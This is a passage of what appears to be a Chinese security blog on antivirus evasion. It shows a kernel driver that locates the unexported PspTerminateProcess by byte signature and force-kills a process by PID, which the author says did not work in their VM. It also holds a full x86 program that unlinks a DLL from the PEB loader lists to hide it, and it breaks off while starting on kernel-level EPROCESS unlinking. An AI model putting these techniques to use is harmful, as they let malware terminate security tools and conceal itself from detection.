nt!PspTerminateProcess+<span class="number">0x65</span> (fffff804`<span class="number">11</span>eeb465)</span><br><span class="line">fffff804`<span class="number">11</span>eeb45d <span class="number">488b</span>cb          mov     rcx,rbx</span><br><span class="line">fffff804`<span class="number">11</span>eeb460 e8fbf2c4ff      call    nt!EtwTraceProcessTerminate (fffff804`<span class="number">11b</span>3a760)</span><br><span class="line">fffff804`<span class="number">11</span>eeb465 <span class="number">33</span>d2            xor     edx,edx</span><br></pre></td></tr></table></figure>

<p>提取出如下特征码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UCHAR szSpecialCode[] = &#123;0x75,0xee,0x44,0x8b,0xf0,0x41,0x83,0xe6,0x08,0x0f,0x85,0xb9,0x00,0x00,0x00,0x8b,0x0d,0x28,0x10,0x61,0x00,0xf6,0xc1,0x01,0x74,0x08,0x48,0x8b,0xcb,0xe8,0xfb,,0xf2,0xc4,0xff,0x33,0xd2&#125;</span><br></pre></td></tr></table></figure>

<h2 id="demo（x64）"><a href="#demo（x64）" class="headerlink" title="demo（x64）"></a>demo（x64）</h2><p>这是用我自己虚拟机调的，但是没反应，DbgView也没有输出，先挂个代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">	LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">	LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">	LIST_ENTRY InInitianlizationOrderLinks;</span><br><span class="line">	PVOID DllBase;</span><br><span class="line">	PVOID EntryPoint;</span><br><span class="line">	UINT32 SizeofImage;</span><br><span class="line">	UNICODE_STRING FullDllName;</span><br><span class="line">	UNICODE_STRING BaseDllName;</span><br><span class="line">	UINT32 Flags;</span><br><span class="line">	UINT16 LoadCount;</span><br><span class="line">	UINT16 TlsIndex;</span><br><span class="line">	LIST_ENTRY HashLinks;</span><br><span class="line">	PVOID SectionPointer;</span><br><span class="line">	UINT32 CheckSum;</span><br><span class="line">	UINT32 TimeDateStamp;</span><br><span class="line">	PVOID LoadedImports;</span><br><span class="line">	PVOID EntryPointActivationContext;</span><br><span class="line">	PVOID PatchInformation;</span><br><span class="line">&#125;LDR_DATA_TABLE_ENTRY,*PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(*pfnPspTerninateProcess)</span><span class="params">(PEPROCESS pEprocess, NTSTATUS ExitCode)</span>;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(IN PDRIVER_OBJECT driverObject)</span>;<span class="comment">//定义卸载驱动</span></span><br><span class="line"></span><br><span class="line">PVOID <span class="title function_">SearchFunction</span><span class="params">(PUCHAR DllBase, UINT32 SizeOfImage)</span>;<span class="comment">//查找模块中匹配的特征码</span></span><br><span class="line"></span><br><span class="line">ULONG g_uPID = <span class="number">1912</span>;<span class="comment">//关闭的进程PID</span></span><br><span class="line"></span><br><span class="line">UCHAR szSpecialCode[] = &#123; <span class="number">0x75</span>,<span class="number">0xee</span>,<span class="number">0x44</span>,<span class="number">0x8b</span>,<span class="number">0xf0</span>,<span class="number">0x41</span>,<span class="number">0x83</span>,<span class="number">0xe6</span>,<span class="number">0x08</span>,<span class="number">0x0f</span>,<span class="number">0x85</span>,<span class="number">0xb9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x8b</span>,<span class="number">0x0d</span>,<span class="number">0x28</span>,<span class="number">0x10</span>,<span class="number">0x61</span>,<span class="number">0x00</span>,<span class="number">0xf6</span>,<span class="number">0xc1</span>,<span class="number">0x01</span>,<span class="number">0x74</span>,<span class="number">0x08</span>,<span class="number">0x48</span>,<span class="number">0x8b</span>,<span class="number">0xcb</span>,<span class="number">0xe8</span>,<span class="number">0xfb</span>,<span class="number">0xf2</span>,<span class="number">0xc4</span>,<span class="number">0xff</span>,<span class="number">0x33</span>,<span class="number">0xd2</span> &#125;;</span><br><span class="line"></span><br><span class="line">UINT32 g_uSpecialCodeLen = <span class="keyword">sizeof</span>(szSpecialCode);<span class="comment">//特征码长度</span></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING registryPath)</span> &#123;</span><br><span class="line">	NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLdrDataTableEntry = <span class="literal">NULL</span>;</span><br><span class="line">	pfnPspTerninateProcess pPspTerminateProcess = <span class="literal">NULL</span>;</span><br><span class="line">	PEPROCESS pEprocess = <span class="literal">NULL</span>;</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动加载完成\r\n&quot;</span>);</span><br><span class="line">	pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)driverObject-&gt;DriverSection;</span><br><span class="line">	pLdrDataTableEntry = CONTAINING_RECORD(pLdrDataTableEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);</span><br><span class="line">	pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pLdrDataTableEntry-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		pLdrDataTableEntry = CONTAINING_RECORD(pLdrDataTableEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);</span><br><span class="line">		<span class="comment">//如果存在则搜索特征码</span></span><br><span class="line">		<span class="keyword">if</span> (pLdrDataTableEntry-&gt;DllBase) &#123;</span><br><span class="line">			pPspTerminateProcess = (pfnPspTerninateProcess)SearchFunction((PUCHAR)pLdrDataTableEntry-&gt;DllBase, pLdrDataTableEntry-&gt;SizeofImage);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (pPspTerminateProcess)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="comment">//遍历</span></span><br><span class="line">		pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pLdrDataTableEntry-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">	&#125; <span class="keyword">while</span> ((UINT32)pLdrDataTableEntry != (UINT32)driverObject-&gt;DriverSection);</span><br><span class="line">	<span class="keyword">if</span> (pPspTerminateProcess) &#123;</span><br><span class="line">		status = PsLookupProcessByProcessId((HANDLE)g_uPID, &amp;pEprocess);</span><br><span class="line">		<span class="keyword">if</span> (NT_SUCCESS(status)) &#123;</span><br><span class="line">			status = pPspTerminateProcess(pEprocess, <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span> (NT_SUCCESS(status)) &#123;</span><br><span class="line">				DbgPrint(<span class="string">&quot;使用PspTerminateProcess关闭进程成功%d\r\n&quot;</span>, g_uPID);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			DbgPrint(<span class="string">&quot;PsLookupProcessByProcessId Error 0x%x\r\n&quot;</span>, status);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	driverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(IN PDRIVER_OBJECT driverObject)</span> &#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动卸载完成\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PVOID <span class="title function_">SearchFunction</span><span class="params">(PUCHAR DllBase, UINT32 SizeOfImage)</span> &#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;Here is MemorySearch,length is :%d\r\n&quot;</span>, SizeOfImage);</span><br><span class="line">	PVOID pFuncAddr = <span class="literal">NULL</span>;</span><br><span class="line">	UINT32 uEnd = (UINT32)DllBase + SizeOfImage - g_uSpecialCodeLen;<span class="comment">//减去特征码后的长度</span></span><br><span class="line">	UINT32 i = <span class="number">0</span>;</span><br><span class="line">	BOOLEAN bOk = TRUE;</span><br><span class="line">	<span class="keyword">while</span> ((UINT32)DllBase &lt;= uEnd)</span><br><span class="line">	&#123;</span><br><span class="line">		bOk = TRUE;</span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_uSpecialCodeLen; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!MmIsAddressValid(&amp;DllBase[i]) || DllBase[i] != szSpecialCode[i]) &#123;</span><br><span class="line">				bOk = FALSE;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (bOk) &#123;</span><br><span class="line">			pFuncAddr = (PVOID)(DllBase - <span class="number">65</span>);</span><br><span class="line">			DbgPrint(<span class="string">&quot;找到特征码,内存地址为%p\r\n&quot;</span>, pFuncAddr);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		DllBase++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> pFuncAddr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/%E8%BF%9B%E7%A8%8B%E5%BC%BA%E6%9D%80/" data-id="cm1zwlrfs000ku0v61ziu948q" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/进程和线程" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.568Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h1><p><strong>进程</strong>（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基 本单位，是操作系统结构的基础。在早期面向进程设计的计算机结构中，进程是程序的基本执行实体； 在当代面向线程设计的计算机结构中，<strong>进程是线程的容器。</strong>程序是指令、数据及其组织形式的描述，进 程是程序的实体</p>
<p><strong>线程</strong>（Thread）是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作 单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执 行不同的任务。在Unix System V及SunOS中也被称为轻量进程（lightweight processes），但轻量进 程更多指内核线程（kernel thread），而把用户线程（user thread）称为线程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt _TEB</span><br><span class="line">nt!_TEB</span><br><span class="line">   +0x000 NtTib            : _NT_TIB</span><br><span class="line">   +0x038 EnvironmentPointer : Ptr64 Void</span><br><span class="line">   +0x040 ClientId         : _CLIENT_ID</span><br><span class="line">   +0x050 ActiveRpcHandle  : Ptr64 Void</span><br><span class="line">   +0x058 ThreadLocalStoragePointer : Ptr64 Void</span><br><span class="line">   +0x060 ProcessEnvironmentBlock : Ptr64 _PEB</span><br><span class="line">   +0x068 LastErrorValue   : Uint4B</span><br><span class="line">   +0x06c CountOfOwnedCriticalSections : Uint4B</span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这个表中的0x60 有一个指向PEB的指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt _PEB</span><br><span class="line">nt!_PEB</span><br><span class="line">.......................................</span><br><span class="line">   +<span class="number">0x004</span> Padding0         : [<span class="number">4</span>] UChar</span><br><span class="line">   +<span class="number">0x008</span> Mutant           : Ptr64 Void</span><br><span class="line">   +<span class="number">0x010</span> ImageBaseAddress : Ptr64 Void</span><br><span class="line">   +<span class="number">0x018</span> Ldr              : Ptr64 _PEB_LDR_DATA</span><br><span class="line">   +<span class="number">0x020</span> ProcessParameters : Ptr64 _RTL_USER_PROCESS_PARAMETERS</span><br><span class="line">  ........................................</span><br></pre></td></tr></table></figure>

<p>0x18有一个Ldr _PEB_LDR_DATA</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt _PEB_LDR_DATA</span><br><span class="line">nt!_PEB_LDR_DATA</span><br><span class="line">   +0x000 Length           : Uint4B</span><br><span class="line">   +0x004 Initialized      : UChar</span><br><span class="line">   +0x008 SsHandle         : Ptr64 Void</span><br><span class="line">   +0x010 InLoadOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +0x020 InMemoryOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +0x030 InInitializationOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +0x040 EntryInProgress  : Ptr64 Void</span><br><span class="line">   +0x048 ShutdownInProgress : UChar</span><br><span class="line">   +0x050 ShutdownThreadId : Ptr64 Void</span><br></pre></td></tr></table></figure>

<p>这里有三个链表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InLoadOrderModuleList ：模块加载的顺序</span><br><span class="line">InMemoryOrderModuleList ：模块在内存的顺序</span><br><span class="line">InInitializationOrderModuleList ：模块初始化的顺序</span><br></pre></td></tr></table></figure>

<p>这几个链表结构如下</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925090246577.png" alt="image-20240925090246577"></p>
<p>我们可以看到单独的一个链表头有两个成员，第一个成员Flink指向下一个节点，而Blink指向上一个节点</p>
<p>例如从_PEB_LDR_DATA InLoadOrderModuleList里面的Flink就是指向第一个模块，然后第一个模块的里面的InLoadOrderModuleList里面的Flink指向第二个模块</p>
<p>简言之，_PEB_LDR_DATA中 InLoadOrderModuleList是入口，剩下的 InLoadOrderModuleList构成一个环</p>
<p>通过这些InLoadOrderModuleList我们便可以查找到模块加载的地址，例如kernel32.dll就一般在第三个模块处</p>
<h2 id="三环断链"><a href="#三环断链" class="headerlink" title="三环断链"></a>三环断链</h2><p>在了解了程序寻找模块的基本原理之后，我们就可以通过断链来实现模块的隐藏</p>
<p>在正常的枚举模块中一般都使用CreateToolhelp32Snapshot来拍摄快照，然后找到_PEB_LDR_DATA来获取知道程序有那些模块，所以如果我们想隐藏某个dll，那么，我们就可以通过修改这几个双向链表来隐藏</p>
<p>同理，我们还需要注意_DRIVER_OBJECT结构体中0x14的一个成员DriverSection，它指向一个结构体_LDR_DATA_TABLE_ENTRY</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt _LDR_DATA_TABLE_ENTRY</span><br><span class="line">nt!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +0x000 InLoadOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x010 InMemoryOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x020 InInitializationOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x030 DllBase          : Ptr64 Void</span><br><span class="line">   +0x038 EntryPoint       : Ptr64 Void</span><br><span class="line">   +0x040 SizeOfImage      : Uint4B</span><br><span class="line">  ..............................</span><br></pre></td></tr></table></figure>

<p>在_LDR_DATA_TABLE_ENTRY的0x30处是DLLbase，这里存放着dll地址</p>
<p>思路如下：我们想要隐藏某个指定的dll，就可以通过DllBase的方式，通过GetModuleHandleA获取dll的句柄，来进行比对</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//LDR链表</span><br><span class="line">typedef struct _PEB_LDR_DATA&#123;</span><br><span class="line">	DWORD Length;</span><br><span class="line">	bool Initialized;</span><br><span class="line">	PVOID SsHandle;</span><br><span class="line">	LIST_ENTRY InLoadOrderModuleList; // 指向了 InLoadOrderModuleList 链表的第一项</span><br><span class="line">	LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">	LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">&#125;PEB_LDR_DATA,*PPEB_LDR_DATA;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _LDR_DATA_TABLE_ENTRY</span><br><span class="line">&#123;</span><br><span class="line">LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">void* BaseAddress;</span><br><span class="line">void* EntryPoint;</span><br><span class="line">ULONG SizeOfImage;</span><br><span class="line">UNICODE_STRING FullDllName;</span><br><span class="line">UNICODE_STRING BaseDllName;</span><br><span class="line">ULONG Flags;</span><br><span class="line">SHORT LoadCount;</span><br><span class="line">SHORT TlsIndex;</span><br><span class="line">HANDLE SectionHandle;</span><br><span class="line">ULONG CheckSum;</span><br><span class="line">ULONG TimeDateStamp;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>

<p>本质上就是一个双向链表断链的操作</p>
<p>这里给一个断Kernel32.dll的demo（x86）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">// killPEB.cpp : Defines the entry point for the console application.</span><br><span class="line">//</span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">typedef struct _UNICODE_STRING &#123;</span><br><span class="line">USHORT Length;</span><br><span class="line">USHORT MaximumLength;</span><br><span class="line">PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING, *PUNICODE_STRING;</span><br><span class="line">typedef struct _PEB_LDR_DATA</span><br><span class="line">&#123;</span><br><span class="line">DWORD Length;</span><br><span class="line">bool Initialized;</span><br><span class="line">PVOID SsHandle;</span><br><span class="line">LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA;</span><br><span class="line">// LDR表项，存储了模块信息</span><br><span class="line">typedef struct _LDR_DATA_TABLE_ENTRY</span><br><span class="line">&#123;</span><br><span class="line">LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">void* BaseAddress;</span><br><span class="line">void* EntryPoint;</span><br><span class="line">ULONG SizeOfImage;</span><br><span class="line">UNICODE_STRING FullDllName;</span><br><span class="line">UNICODE_STRING BaseDllName;</span><br><span class="line">ULONG Flags;</span><br><span class="line">SHORT LoadCount;</span><br><span class="line">SHORT TlsIndex;</span><br><span class="line">HANDLE SectionHandle;</span><br><span class="line">ULONG CheckSum;</span><br><span class="line">ULONG TimeDateStamp;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line">void HideModule(HMODULE hModule)</span><br><span class="line">&#123;</span><br><span class="line">PPEB_LDR_DATA ldr;</span><br><span class="line">PLDR_DATA_TABLE_ENTRY ldte;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax,fs:[0x30]</span><br><span class="line">mov ecx,[eax + 0x0c]</span><br><span class="line">mov ldr,ecx</span><br><span class="line">&#125;</span><br><span class="line">PLIST_ENTRY Head, Cur;</span><br><span class="line">Head = &amp;(ldr-&gt;InLoadOrderModuleList);</span><br><span class="line">Cur = Head-&gt;Flink;</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">ldte = CONTAINING_RECORD( Cur, LDR_DATA_TABLE_ENTRY,</span><br><span class="line">InLoadOrderModuleList);</span><br><span class="line">if (ldte-&gt;BaseAddress == hModule)</span><br><span class="line">&#123;</span><br><span class="line">ldte-&gt;InLoadOrderModuleList.Blink-&gt;Flink = ldte-</span><br><span class="line">&gt;InLoadOrderModuleList.Flink;</span><br><span class="line">ldte-&gt;InLoadOrderModuleList.Flink-&gt;Blink = ldte-</span><br><span class="line">&gt;InLoadOrderModuleList.Blink;</span><br><span class="line">&#125;</span><br><span class="line">Cur = Cur-&gt;Flink;</span><br><span class="line">&#125; while(Head != Cur);</span><br><span class="line">Head = &amp;(ldr-&gt;InMemoryOrderModuleList);</span><br><span class="line">Cur = Head-&gt;Flink;</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">ldte = CONTAINING_RECORD( Cur, LDR_DATA_TABLE_ENTRY,</span><br><span class="line">InMemoryOrderModuleList);</span><br><span class="line">if (ldte-&gt;BaseAddress == hModule)</span><br><span class="line">&#123;</span><br><span class="line">ldte-&gt;InMemoryOrderModuleList.Blink-&gt;Flink = ldte-</span><br><span class="line">&gt;InMemoryOrderModuleList.Flink;</span><br><span class="line">ldte-&gt;InMemoryOrderModuleList.Flink-&gt;Blink = ldte-</span><br><span class="line">&gt;InMemoryOrderModuleList.Blink;</span><br><span class="line">&#125;</span><br><span class="line">Cur = Cur-&gt;Flink;</span><br><span class="line">&#125; while(Head != Cur);</span><br><span class="line">所有模块隐藏</span><br><span class="line">Head = &amp;(ldr-&gt;InInitializationOrderModuleList);</span><br><span class="line">Cur = Head-&gt;Flink;</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">ldte = CONTAINING_RECORD( Cur, LDR_DATA_TABLE_ENTRY,</span><br><span class="line">InInitializationOrderModuleList);</span><br><span class="line">if (ldte-&gt;BaseAddress == hModule)</span><br><span class="line">&#123;</span><br><span class="line">ldte-&gt;InInitializationOrderModuleList.Blink-&gt;Flink = ldte-</span><br><span class="line">&gt;InInitializationOrderModuleList.Flink;</span><br><span class="line">ldte-&gt;InInitializationOrderModuleList.Flink-&gt;Blink = ldte-</span><br><span class="line">&gt;InInitializationOrderModuleList.Blink;</span><br><span class="line">&#125;</span><br><span class="line">Cur = Cur-&gt;Flink;</span><br><span class="line">&#125; while(Head != Cur);</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, CHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;点任意按键开始断链&quot;);</span><br><span class="line">getchar();</span><br><span class="line">HideModule(GetModuleHandleA(&quot;kernel32.dll&quot;));</span><br><span class="line">printf(&quot;断链成功\n&quot;);</span><br><span class="line">getchar();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="零环断链"><a href="#零环断链" class="headerlink" title="零环断链"></a>零环断链</h2><p>   3环的断链基本上也就是骗骗一般的查看器，例如我们的任务管理器或者是Process hacker这种，都是到0环去读取我们的进程列表，这时候我们就要上驱动了</p>
<p>在操作系统的层面上，进程的本质上就是一个结构体，当操作系统想要创建一个进程的时候，就分配一块内存</p>
<p>这里我们以x86为例</p>
<p>我们要找的这个结构就是EPROCESS，我们在0x88处找到了名为ActiveProcessLinks 的 _LIST_ENTRY，这个指针指向的是一个将所有活动进程都连接到一起的双向链表</p>
